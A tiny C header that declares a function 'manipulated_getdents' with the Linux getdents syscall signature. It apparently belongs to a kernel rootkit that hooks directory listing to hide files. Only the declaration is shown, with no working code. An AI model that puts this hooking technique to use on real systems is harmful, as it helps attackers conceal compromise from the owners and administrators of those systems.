#ifndef GETDENTS_HEADER
#define GETDENTS_HEADER

#include "include.h"

asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);

#endif
